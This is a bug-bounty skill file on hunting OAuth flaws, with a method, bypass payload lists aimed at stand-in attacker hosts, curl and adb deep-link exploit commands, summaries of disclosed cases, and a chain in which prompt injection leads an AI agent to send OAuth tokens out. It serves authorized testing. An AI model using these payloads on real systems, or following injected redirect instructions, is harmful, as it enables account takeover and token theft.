---
name: hunt-oauth
description: Hunting skill for oauth vulnerabilities. Built from 19 public bug bounty reports. Use when hunting oauth on any target.
sources: github, hackerone_public, salt_labs, descope, detectify_labs, harel_research
report_count: 19
---

## Crown Jewel Targets

OAuth vulnerabilities are among the highest-value bug classes in web security because they directly enable **account takeover, session theft, and authentication bypass** — the trifecta that programs pay most for.

**Highest-value targets:**
- **Consumer identity providers** (Google, Facebook, PayPal, Apple SSO integrations) — any compromise cascades across all relying parties
- **Mobile apps with custom deep link OAuth handlers** — Android/iOS intent handling is notoriously loose
- **Multi-tenant SaaS platforms** (GitLab, Reddit-scale apps) where one OAuth flaw hits millions of accounts
- **Gaming/entertainment platforms** with federated login (Rockstar, Oculus) — often security-immature teams
- **Enterprise SSO connectors** — critical infrastructure, high severity payouts

**Asset types that pay most:**
- OAuth authorization endpoints (`/oauth/authorize`, `/connect/authorize`)
- Token exchange endpoints (`/oauth/token`)
- Mobile deep link handlers (`push_notification_webview`, custom scheme URIs)
- Social login callback handlers (`/auth/callback`, `/oauth/callback`)

**Typical payouts:** $500–$20,000+ depending on program; account takeover findings often hit max bounty.

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/oauth/authorize
/oauth/token
/connect/authorize
/auth/callback
/oauth/callback
/login?redirect_uri=
/signin?next=
/auth?return_to=
/oauth/redirect
/push_notification_webview
```

### Response Headers That Signal OAuth
```
Location: https://accounts.example.com/oauth/...
Set-Cookie: oauth_state=
WWW-Authenticate: Bearer
Content-Type: application/json (with access_token in body)
```

### JavaScript Patterns (grep in JS bundles)
```javascript
redirect_uri
client_id
response_type=code
response_type=token
state=
nonce=
oauth_token
access_token
push_notification_webview
deeplink
intent://
```

### Tech Stack Signals
- Android apps with `intent-filter` in `AndroidManifest.xml` handling `http://` or custom scheme URIs
- Apps using Doorkeeper, OmniAuth, Devise (Ruby), Passport.js (Node), Spring Security OAuth
- Social login buttons (Google, Facebook, Apple) = OAuth surface guaranteed
- `.well-known/openid-configuration` present = full OIDC surface available

---

## Step-by-Step Hunting Methodology

1. **Enumerate all OAuth entry points**
   - Spider the app for `/oauth`, `/connect`, `/auth`, `/login` paths
   - Check `.well-known/openid-configuration` and `.well-known/oauth-authorization-server`
   - Decompile mobile APKs: `apktool d app.apk` and grep for `redirect_uri`, `intent://`, deep link schemes

2. **Map the full OAuth flow**
   - Capture the authorization request: note `client_id`, `redirect_uri`, `state`, `nonce`, `response_type`
   - Capture the callback: note where tokens/codes land, what validates state/nonce

3. **Test `redirect_uri` validation (highest yield)**
   - Try exact host bypass: `redirect_uri=https://legit.com.evil.com`
   - Try path traversal: `redirect_uri=https://legit.com/callback/../../../evil`
   - Try open redirects on the legitimate domain first, then chain into OAuth
   - Try parameter pollution: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
   - Try encoded characters: `%2F`, `%40`, `%23` to confuse parsers

4. **Test `state` parameter (CSRF)**
   - Remove `state` entirely — does the flow complete?
   - Reuse a fixed `state` value across sessions
   - Check if `state` is validated server-side or only client-side

5. **Test `nonce` parameter (replay/bypass)**
   - Capture a nonce from one flow, attempt to replay it in another
   - Check if nonce is validated after token exchange
   - Test if nonce can be extracted via referrer leak (step 9)

6. **Test authentication step completeness**
   - For multi-step auth (e.g., email verification + OAuth): can you skip to `/oauth/token` directly?
   - Check if partial auth state (unverified email) is accepted by the token endpoint

7. **Hunt referrer leakage**
   - After OAuth callback with tokens in URL fragment or query, check if any on-page resources (images, scripts, iframes) receive the full `Referer` header
   - Look specifically at language switchers, analytics calls, social share buttons triggered post-auth

8. **Test mobile deep links**
   - For Android: craft malicious intent URIs that redirect the OAuth webview to attacker-controlled URLs
   - Check if deep link handlers validate the origin/host before loading
   - Test `push_notification_webview` patterns that accept arbitrary URLs

9. **Test misconfigured client credentials**
   - Check if `client_secret` appears in JS bundles or APK resources
   - Test if token endpoint accepts arbitrary `redirect_uri` values when combined with leaked `client_id`/`client_secret`

10. **Verify and document**
    - Confirm state is not validated → CSRF to account link
    - Confirm token lands on attacker domain → session theft
    - Confirm email verification skippable → auth bypass
    - Run Gate 0 check before reporting

---

## Payload & Detection Patterns

### redirect_uri Bypass Payloads
```
# Host confusion
https://evil.com#legit.com
https://legit.com.evil.com
https://legit.com@evil.com

# Path traversal
https://legit.com/oauth/callback/../../redirect?url=https://evil.com

# Open redirect chain (find open redirect on legit domain first)
https://legit.com/logout?next=https://evil.com

# Parameter pollution
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# URL encoded slashes
https://legit.com%2F@evil.com
https://legit.com%252F..%252F..evil.com
```

### State CSRF Test
```bash
# Step 1: Initiate OAuth flow, capture state value
# Step 2: Drop request, use attacker account's link with victim's session
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"

# Step 3: Force victim to visit callback with attacker's code + fixed state
https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
```

### Nonce Extraction via Referrer
```bash
# After OAuth callback landing page, check outbound requests
# Look for Referer header containing access_token or code
curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
  -H "Referer: https://evil.com" \
  --max-redirs 0

# Grep JS for outbound calls made on callback page
grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
```

### Mobile Deep Link Exploit (Android)
```bash
# ADB exploit for push_notification_webview deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"

# Craft intent URI for web-based exploit
<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
```

### Token Endpoint Auth Bypass
```bash
# Test unauthenticated token exchange (skip email verification)
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://legit.com/callback"

# Test with unverified account credentials
curl -X POST https://target.com/oauth/token \
  -d "grant_type=password" \
  -d "username=unverified@evil.com" \
  -d "password=password123" \
  -d "client_id=CLIENT_ID"
```

### Grep Patterns for Recon
```bash
# In APK/JS files
grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .
grep -r "intent://\|deeplink\|scheme://" .

# In Burp history
# Filter: URL contains "oauth" OR "token" OR "callback"
# Filter: Response contains "access_token" OR "code=" in Location header

# Check .well-known
curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
```

---

## Common Root Causes

1. **Weak `redirect_uri` validation** — developers whitelist by prefix (`startsWith`) rather than exact match, or whitelist an entire domain instead of specific paths. A sub-path open redirect on the same domain then becomes a full token theft primitive.

2. **Missing or unvalidated `state` parameter** — developers implement OAuth by following basic tutorials that omit CSRF protection, or validate state client-side only in JavaScript (easily bypassed).

3. **Nonce not validated post-exchange** — nonce is generated and sent in the request but never verified against the ID token after the code exchange, making replay attacks possible.

4. **Authentication step ordering not enforced server-side** — teams implement multi-step auth (signup → email verify → OAuth grant) but don't enforce the sequence server-side. The token endpoint doesn't check completion of prerequisite steps.

5. **Token/code in URL with outbound requests on callback page** — developers land users on a callback page with tokens in the query string, then that page fires analytics, social share, or CDN requests that leak the full URL via `Referer` header.

6. **Mobile deep link handlers trust all input URLs** — Android/iOS developers build webview wrappers for push notification flows without validating that the loaded URL belongs to their own domain.

7. **Misconfigured OAuth application registration** — developers register wildcard redirect URIs (`https://*.example.com/*`) or don't restrict them at all during development and forget to lock down for production.

8. **Client secrets embedded in mobile apps** — treating confidential client credentials as public, enabling an attacker with the secret to perform token requests with arbitrary redirect URIs.

---

## Bypass Techniques

### Defender: Exact-match `redirect_uri` whitelist
**Bypass:** Find an open redirect on the whitelisted domain itself, then use that URL as the redirect_uri. The OAuth server validates the registered domain ✓, but the open redirect bounces the code/token to attacker.
```
redirect_uri=https://legit.com/logout?next=https://evil.com
```

### Defender: `state` parameter required
**Bypass:** Check if state is validated for *length/format* but not *binding to session*. Use a fixed predictable state value. Also check if PKCE is enforced — if not, the state check alone is insufficient for code injection.

### Defender: Fragment-only token delivery (`response_type=token`)
**Bypass:** Fragment isn't sent in `Referer` by browsers, but JavaScript on the callback page may read `window.location.hash` and pass it to analytics or postMessage to a parent frame. Intercept postMessage handlers.

### Defender: Host validation on mobile deep links
**Bypass:** Try URL encoding (`https%3A//evil.com`), double encoding, Unicode normalization, or null bytes to confuse the validator while the underlying webview still navigates correctly.

### Defender: Short-lived authorization codes
**Bypass:** Referrer leakage and open redirects work even with short-lived codes if the attacker has a fast receiver. For CSRF, the victim completes the flow so timing is less critical.

### Defender: PKCE enforcement
**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.

### Defender: Nonce validation
**Bypass:** Check if nonce is validated client-side in JavaScript only. Intercept and modify the ID token's nonce claim if the signature isn't verified (rare but seen in misconfigured implementations). Also test if nonce is validated on *initial* request but not on token refresh.

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Be specific: "I can send victim a crafted URL → victim clicks → their OAuth code redirects to my server → I exchange code for access token → I am now logged in as victim." If you can't complete this full chain, it may be informational only.

**2. What does the victim LOSE?**
Minimum bar: victim loses authenticated session (account access). Higher bars: victim loses linked accounts, payment methods, private data. If the attacker only learns the victim's identity without gaining access, severity drops significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Open a fresh browser/device with no prior state. If you can walk from "unauthenticated" to "authenticated as victim" in 10 minutes using only your written steps, the bug is real and reportable. If it requires lucky timing, specific victim behavior beyond "click a link," or network position, document those dependencies explicitly.

---

## Real Impact Examples

### Scenario 1: Mobile Session Theft via Push Notification Deep Link (PayPal/Venmo pattern)
An attacker discovers that the Android app's push notification handler accepts an arbitrary `url` parameter in its deep link scheme without validating the host. The attacker crafts a malicious URL using the app's custom scheme pointing to their own server. When sent to a victim (via social engineering or a compromised push notification channel), the app opens a WebView navigating to the attacker's server — which then initiates an OAuth flow and captures the OAuth token as it's returned to the "callback" now under attacker control. Result: full account takeover on a payments platform affecting millions of users. Business impact: unauthorized fund transfers, exposure of linked payment methods and transaction history.

### Scenario 2: Email Verification Bypass via Direct Token Endpoint Access (GitLab pattern)
A developer creates an account with an unverified email address. Normally the platform blocks full access until email is verified. However, the `/oauth/token` endpoint performs no verification status check — it only validates credentials. The attacker calls `/oauth/token` directly with valid (unverified) credentials and receives a fully-scoped OAuth token. This token passes all downstream authorization checks. Result: complete authentication bypass, allowing unverified/disposable email accounts to gain full platform access, undermining the email verification security control entirely. At scale on a platform like GitLab, this affects CI/CD pipeline access, repository access, and API usage.

### Scenario 3: OAuth Token Theft via Referrer Header on Language Change (Rockstar Games pattern)
The OAuth callback page for Facebook login lands users at a URL containing the `access_token` in the query string. The page includes a language-switcher widget that makes a GET request to change locale preferences. This GET request includes the full page URL as a `Referer` header — containing the Facebook access token. An attacker who can read server logs (or who compromises the language-change endpoint, or who is a malicious advertiser with pixel access) harvests Facebook OAuth tokens from Referer logs. Result: the attacker can authenticate to the victim's Facebook account and any other service accepting that Facebook token, constituting a cross-platform account takeover. Business impact: GDPR/privacy violation, cross-service account compromise, potential regulatory liability.

---

## Disclosed Report Citations (Backfill +9 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 10 internal references. Each is a distinct OAuth subclass with a working PoC documented in the cited writeup.

11. **Semrush — IDN-homograph redirect_uri bypass** ([H1 #861940](https://hackerone.com/reports/861940))
    - Subclass: `redirect_uri` bypass via Unicode-confusable host (homograph)
    - Payload: `redirect_uri=https://oauth.šemrush.com/cb` (punycode `xn--emrush-9jb.com`) — passed Latin-only string check on validator
    - Root cause: server validates `redirect_uri` host as ASCII-string equality but does not normalize Unicode → confusables → punycode before compare
    - Disclosure: 2020, public bounty (amount not disclosed); discoverer Yassine Aboukir

12. **Bohemia Interactive — redirect_uri filter bypass (BiStudio)** ([H1 #405100](https://hackerone.com/reports/405100))
    - Subclass: `redirect_uri` validation bypass → OAuth token exfiltration
    - Payload: redirect_uri crafted to defeat the regex/prefix filter and land tokens on attacker host; reporter chained the bypass to a full token-leak PoC
    - Root cause: weak redirect_uri filter that accepted attacker-controlled host while still matching the intended pattern
    - Year: 2018-disclosed; remains a canonical example of regex-redirect_uri-bypass cited in subsequent reports

13. **pixiv — path-traversal in OAuth `redirect_uri`** ([H1 #1861974](https://hackerone.com/reports/1861974))
    - Subclass: path-traversal `redirect_uri` bypass → authorization-code leakage
    - Payload: `redirect_uri=https://legit.pixiv.host/legit/../../attacker/cb` — server normalized after validation
    - Root cause: validator inspected raw string; downstream HTTP/browser handled `../` traversal and emitted code to attacker path
    - Disclosure: 2023, **$2,000 bounty**, 244 upvotes — confirmed paid

14. **Slack — OAuth2 redirect_uri bypass (domain-suffix)** ([H1 #2575](https://hackerone.com/reports/2575))
    - Subclass: `redirect_uri` validation bypass via domain-suffix / subdomain confusion
    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.com`) defeated the suffix-only check
    - Root cause: `endsWith()` / suffix-match instead of strict host equality
    - Disclosure: 2013 (foundational case still cited in modern OAuth training material) — Slack public bounty

15. **Booking.com (Facebook social-login)** ([Salt Labs writeup](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com))
    - Subclass: three-step chain — open-redirect on whitelisted domain + redirect_uri bypass + `response_type` swap → Facebook OAuth code/token theft → ATO
    - Payload: authorize URL with `redirect_uri=https://account.booking.com/<open-redirect>?next=https://attacker.tld/cb` and `response_type` toggled to leak tokens via fragment
    - Root cause: validator trusted any path under `account.booking.com`; open redirect on that host bounced the auth code to attacker
    - Disclosure: March 2023 — coordinated disclosure, no public bounty figure (~500M MAU exposure)

16. **Expo.io (`expo-auth-session`) — CVE-2023-28131** ([Salt Labs writeup](https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services))
    - Subclass: scope-creep / unvalidated `returnUrl` parameter → cross-app OAuth-code theft (impacts every consumer of expo-auth-session social login)
    - Payload: attacker passes `returnUrl=https://attacker.tld` to the OAuth proxy → Expo blindly forwards Facebook/Google/Apple/Twitter code to attacker
    - Root cause: framework-level OAuth proxy did not validate `returnUrl` host before forwarding the social-IdP callback
    - Disclosure: May 2023; CVSS 9.6; fixed Feb 2023 hotfix + deprecated by Feb 26 2023

17. **Microsoft Azure AD multi-tenant — "nOAuth"** ([Descope writeup](https://www.descope.com/blog/post/noauth))
    - Subclass: cross-IdP account-takeover via unverified, mutable `email` claim ("Pass-The-Token" equivalent)
    - Payload: attacker sets Azure AD admin profile `mail` attribute to victim's address → clicks "Log in with Microsoft" on relying party that keys users by email claim → instant ATO
    - Root cause: Microsoft `email` claim is mutable + unverified; RPs treated it as primary identifier
    - Disclosure: April 11 2023 reported, fixed June 20 2023 (mitigations + new `xms_edov` claim)

18. **Grammarly / Vidio / Bukalapak — "Pass-The-Token" social-login** ([Salt Labs writeup](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts))
    - Subclass: missing audience / `aud` validation on Facebook access_token → cross-client token replay → ATO
    - Payload: attacker obtains Facebook token issued for `attacker.app` → replays the token to Grammarly/Vidio/Bukalapak login API → server fetches FB user via `/me`, finds victim's email, issues victim session
    - Root cause: relying party calls Facebook `/me` with attacker-issued token but never validates the token's `app_id` belongs to the RP
    - Disclosure: October 2023 — coordinated, ~1B account exposure across the three sites

19. **Zoom — OAuth "dirty dancing" chained ATO** ([Harel Security writeup](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html))
    - Subclass: `response_type=token` swap + lax `postMessage` origin check + cookie-tossing → authorization-code leak via web_message response mode → ATO + cam/mic hijack
    - Payload: attacker page opens Zoom OAuth with `response_type=code&response_mode=web_message`, intercepts the resulting `postMessage` because window listener accepts any `*.zoom.us` origin → exchanges code for session
    - Root cause: combination of weak postMessage origin check, missing CSRF binding on `state`, and `response_mode=web_message` returning code to a parent window without exact-origin enforcement
    - Disclosure: reported Oct 2023, fixed Jan 2024, **$15,000 bounty** (Sudi / BrunoZero / H4R3L)

20. **Detectify Labs — "Dirty Dancing" multi-vendor OAuth token leakage** ([Detectify writeup, F. Rosén](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/))
    - Subclass: response-type switching + invalid-state quirks + 3rd-party JS gadget chains → OAuth code/token leakage with NO XSS required
    - Payload: attacker forces `response_type=token` on an endpoint that only validated `code`; combines with promiscuous postMessage listeners and URL-storage gadgets on the callback page to siphon tokens via cross-origin reads
    - Root cause: OAuth server tolerates response_type downgrade/swap; callback page leaks `window.location` via permissive postMessage receivers
    - Disclosure: July 2022 — multi-vendor (Apple, Microsoft, Slack et al.); PortSwigger Top 10 Web Hacks 2022 #1

---

## Browser-parse vs server-parse — redirect_uri prefix-match bypass shapes

A server-side prefix-match flaw on `redirect_uri` is **necessary but not sufficient** to land the OAuth code on the attacker. The server check passing is one gate; the browser actually navigating cross-origin is another. They behave differently. Always confirm both before writing the finding as a chain → ATO.

| Server `redirect_uri` validator | Attack URL | Server `startswith()` | Browser actual host | Exploit? |
|---|---|---|---|---|
| prefix = `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com (per WHATWG URL parsing — `@` is the userinfo delimiter, BEFORE the first `/` after `://`) | **YES** |
| prefix = `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | **acme.example** (the `@` is now AFTER the first `/`, so WHATWG parses it as a path character) | **NO** — browser stays on acme.example |
| prefix = `https://acme.example` (substring match) | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com (subdomain extension — the `.evil.com` extends the host) | **YES** |
| prefix = `https://acme.example/` (trailing slash, server normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw startswith | acme.example (server normalizes path; even if it didn't, browser path-normalizes too) | usually **NO** |
| prefix = `https://acme.example/` (Chromium-specific) | `https://acme.example/\@evil.com/cb` | passes | host depends — Chromium converts `\` to `/` so this becomes `https://acme.example//@evil.com/cb` and stays on acme.example | usually **NO** |

**Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.

**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.

---

## OIDC Dynamic Client Registration SSRF (the 2025 "OAuth-by-design" class)

OpenID Connect Dynamic Client Registration (`/register`, `/connect/register`) and discovery let a client supply URLs the **provider fetches server-side** — SSRF baked into the spec.

- **Server-side-fetched fields:** `logo_uri`, `jwks_uri`, `sector_identifier_uri`, `request_uri`, `initiate_login_uri`, `policy_uri`/`tos_uri` (some renderers). Register a client pointing these at `http://169.254.169.254/...` or an internal host → the IdP fetches it. `jwks_uri`/`request_uri` are the strongest because the provider *must* retrieve them during the flow, so they fire even where logo fetching is lazy.
- **WebFinger user enumeration:** `/.well-known/webfinger?resource=acct:victim@target.com` often discloses whether an account exists / which IdP it routes to — pre-ATO recon.
- **redirect_uri session poisoning:** the 2025 named variant where a loosely-matched/attacker-influenced `redirect_uri` plants state into the victim's flow (pairs with `hunt-open-redirect` and cookie-tossing).

Confirm SSRF blind-first with `interactsh`/Collaborator in the registered URL, then escalate to metadata/internal like any SSRF (`hunt-ssrf`, `cloud-iam-deep`).

Sources: https://www.intigriti.com/researchers/blog/bug-bytes/bug-bytes-116-new-oauth-attacks-hacking-shopify-with-a-single-dot-netmask-ssrf · https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html

---

## Modern token/flow attacks (commonly missed — audit vs PortSwigger Academy + PATT OAuth + Doyensec)
`redirect_uri`/`state` are well-covered above; these flow/token attacks are the long-tail that gets skipped:
```
[PKCE downgrade]     drop code_challenge + code_challenge_method from /authorize (or downgrade S256→plain,
                     or send code_challenge_method=plain with code_verifier=code_challenge) → if the token
                     endpoint still exchanges the code, PKCE is optional → public-client code interception.
[response_type/mode] tamper response_type code↔token↔"code id_token"(hybrid); flip response_mode to query/
                     fragment/form_post or web_message → fragment/web_message can leak the token via Referer/
                     postMessage to a page you influence. Test prompt=none for silent token minting.
[code reuse / race]  exchange the SAME authorization code twice (and N-parallel race) → if both succeed, code
                     isn't single-use → replay. Also AUTH-CODE INJECTION: paste a victim's code into your own
                     session's token request (or your code into the victim) — bound to session? PKCE stops this.
[id_token validation] if an id_token is accepted (implicit/hybrid/"login with id_token"): alg:none / unsigned,
                     wrong/missing aud, wrong iss, expired, kid/jku/x5u swap (→ hunt-api-misconfig JWT). A
                     forged id_token with {sub: victim} = direct ATO.
[iss/sub confusion]  multi-IdP apps: does the RP bind the account by sub WITHOUT checking iss? mint a token from
                     a DIFFERENT (attacker-controlled or second) IdP with the victim's sub/email → logged in as
                     victim. (2025 class — jsmon/Doyensec.) Also email-without-iss-trust: provider returns an
                     unverified email the RP trusts → register/login as anyone.
[cross-client]       use an access_token/code minted for client_id A at client B's endpoints (token-audience
                     confusion); or a token for a low-scope client accepted by a high-scope API.
[scope upgrade]      add/widen scope at /authorize or /token (scope=openid+admin), or downgrade-then-add; check
                     if the granted scope is enforced or the UI-shown scope ≠ token scope.
```
**Validate ATO with two accounts** (attacker A vs victim B): success = A's session/token authenticates as B, or B's
code/token lands at A. Refs: PortSwigger *OAuth 2.0 authentication vulnerabilities*, PayloadsAllTheThings *OAuth*,
Doyensec *Common OAuth Vulnerabilities (2025)*, jsmon *iss+sub confusion*.

---

## Recent OAuth/OIDC research (2024-2026)

Newer named classes not covered above. Fire each when the corresponding signal appears.

1. **Auth0 cross-tenant session (`sid`) reuse → forged victim-tenant JWT** — Auth0 `/authorize` fails to validate which tenant a session cookie belongs to. Authenticate in your OWN Auth0 tenant, then replay that `sid` cookie against the VICTIM tenant's `/authorize` with the victim `client_id` → Auth0 signs a valid victim-tenant JWT for the same-email identity. Test any Auth0-fronted app: does the `sid`/session cookie get re-scoped per tenant? Source: https://sentorsecurity.com/blog/vulnerability-disclosure-authentication-bypass-in-auth0/

2. **"Sign in with Google" defunct-domain / `hd`-claim reclaim ATO** — Services keying users on Google `email`+`hd` (hosted-domain) rather than the stable `sub` are taken over by buying a dead company's domain, recreating former employees' Workspace mailboxes, and logging into all their SaaS. Standing check on any "Login with Google Workspace" app: is identity bound to `sub` or to the reclaimable `email`/`hd`? Source: https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw

3. **COAT — cross-app OAuth / mix-up in integration (iPaaS) platforms** — On multi-connector platforms a malicious app/AS redirects the user to a benign AS that issues a code; the client still believes it's talking to the malicious AS and forwards the code to the attacker's token endpoint → benign app's auth code leaked (1-click). Affected 11/18 major platforms (CVE-2023-36019). Test connector/iPaaS OAuth: does the client bind the returned code to the `iss`/AS it actually started with? Source: https://www.usenix.org/conference/usenixsecurity25/presentation/luo-kaixuan

4. **OAuth-flow hijack via cookie tossing from a sibling subdomain** — A subdomain takeover/XSS on any `*.target` sets a domain-scoped cookie (state, session, oauth-txn) that overrides the apex's during the OAuth callback, fixing the attacker's `state`/PKCE txn and binding the victim's returned code to the attacker's session. Test whether OAuth state/txn cookies use the `__Host-` prefix and reject sibling-set cookies. Pairs with `hunt-subdomain`/`hunt-session`. Source: https://labs.snyk.io/resources/hijacking-oauth-flows-via-cookie-tossing/

5. **fast-jwt algorithm-confusion re-enabled by leading whitespace (CVE-2026-34950)** — The lib's RS256→HS256 confusion guard is a regex on the key; prefixing the public key with leading whitespace defeats the regex so fast-jwt treats the PEM public key as an HMAC secret — classic alg-confusion resurrected on a "patched" lib. Fingerprint fast-jwt/Node and retest RS256→HS256 with the whitespace twist (`" "+pubkey` as the HMAC secret). Source: https://securityonline.info/fast-jwt-authentication-bypass-cve-2026-34950-whitespace/

6. **OAuth-discovery metadata → OS command injection (mcp-remote CVE-2025-6514)** — A malicious OAuth/OIDC server returns a crafted `authorization_endpoint` in its `.well-known` discovery metadata; the client passes it unsanitized into an OS browser-launch command → RCE on the client (CVSS 9.6). Dynamic OIDC discovery metadata is an injection SOURCE, not just a JWKS/SSRF vector — treat every `.well-known`-derived URL a client executes/opens as tainted. Source: https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/

7. **Auth0 / nextjs-auth0 OAuth parameter injection (`redirect_uri`/`scope`)** — A crafted request into the SDK's authorize handler injects extra OAuth params (`redirect_uri`, etc.), redirecting the flow to attacker endpoints or leaking tokens (Oct 2025 SDK flaw). Fuzz duplicate/extra OAuth params through the app's OWN authorize wrapper — the injection is in the SDK's request builder, not the AS. Source: https://www.webpronews.com/okta-auth0-library-hit-by-oauth-injection-vulnerability-from-ai-code/

8. **Device Authorization Grant (device-code) phishing → durable ATO bypassing MFA/Conditional-Access** — If the target exposes a device grant (`/device_authorization`, `device_code`/`user_code`, `grant_type=urn:ietf:params:oauth:grant-type:device_code`), the attacker starts the flow, sends the victim the **legitimate provider's** verification URL + `user_code` (NO fake page — the whole page is real, which defeats phish-training), the victim approves in their own already-MFA'd session, and the attacker polls `/token` → receives the victim's real, MFA-satisfied access + refresh tokens. Auth is decoupled from the origin session, so MFA/CA don't bind to the attacker's device → durable ATO from any IP. Test any app with a **device/TV/CLI/smart-appliance login**: (1) is the device grant enabled and reachable; (2) missing consent-binding (does approval show WHICH app/scopes/where the request originated); (3) missing `user_code` rate-limits/entropy (brute a valid pending `user_code`); (4) over-broad default scopes on the device client; (5) is the resulting token usable from a completely separate device/IP. Pairs with `m365-entra-attack` (Storm-2372) — kill the device-code exposure if the origin session isn't bound. Sources: Microsoft/Proofpoint 2025 device-code phishing writeups — https://www.proofpoint.com/us/blog/threat-insight/access-granted-phishing-device-code-authorization-account-takeover

## Related Skills & Chains

- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
- **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
- **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.